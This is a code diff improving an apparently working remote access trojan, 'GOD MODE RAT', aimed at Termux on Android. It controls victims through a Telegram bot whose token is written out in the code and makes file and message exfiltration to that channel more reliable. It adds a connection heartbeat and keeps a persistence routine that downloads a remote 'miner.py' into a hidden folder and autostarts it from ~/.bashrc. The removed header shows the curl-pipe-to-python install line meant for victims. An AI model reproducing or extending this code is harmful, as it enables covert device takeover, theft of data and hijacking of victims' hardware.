@@ -1,7 +1,5 @@
 #!/usr/bin/env python3
-# GOD MODE RAT – Final
-# Target: termux-setup-storage && pkg install python -y && curl -sL RAW_URL | python && exit
-
+# GOD MODE RAT – Final v2
 import requests, time, subprocess, os, base64, threading
 
 BOT_TOKEN = '8831967961:AAHcWu_Mb09TlxxLtep5oONbANjABH1nJXk'
@@ -12,13 +10,17 @@ OFFSET = 0
 RAW_URL = 'https://raw.githubusercontent.com/kidusgetaw0-sys/UI/main/miner.py'
 
 def send(text, file_path=None):
-    try:
-        if file_path:
-            with open(file_path, 'rb') as f:
-                requests.post(f'{API}/sendDocument', data={'chat_id': CHANNEL_ID}, files={'document': f})
-        else:
-            requests.post(f'{API}/sendMessage', json={'chat_id': CHANNEL_ID, 'text': f'[{DEVICE_ID}] {text}'})
-    except: pass
+    for attempt in range(5):
+        try:
+            if file_path:
+                with open(file_path, 'rb') as f:
+                    requests.post(f'{API}/sendDocument', data={'chat_id': CHANNEL_ID}, files={'document': f}, timeout=15)
+            else:
+                requests.post(f'{API}/sendMessage', json={'chat_id': CHANNEL_ID, 'text': f'[{DEVICE_ID}] {text}'}, timeout=15)
+            return
+        except:
+            time.sleep(3)
+    # Silent fail after 5 attempts
 
 def execute(cmd):
     parts = cmd.split(maxsplit=1)
@@ -59,13 +61,10 @@ def persist():
     os.makedirs(os.path.expanduser('~/.hidden'), exist_ok=True)
     script_path = os.path.expanduser('~/.hidden/rat.py')
     try:
-        # Download the script fresh from GitHub (avoids stdin issue)
         r = requests.get(RAW_URL, timeout=10)
         with open(script_path, 'w') as f:
             f.write(r.text)
-    except:
-        # Fallback: try reading from stdin (unlikely but keeps it alive)
-        pass
+    except: pass
     with open(os.path.expanduser('~/.bashrc'), 'a') as f:
         f.write('\n(sleep 10 && python ~/.hidden/rat.py &) & disown\n')
     os.makedirs('/sdcard/.system_cache', exist_ok=True)
@@ -75,6 +74,9 @@ def persist():
 
 def poll():
     global OFFSET
+    # Send initial heartbeat after network is ready
+    time.sleep(3)
+    send('RAT Connected')
     while True:
         try:
             resp = requests.get(f'{API}/getUpdates?offset={OFFSET}&timeout=30', timeout=35).json()
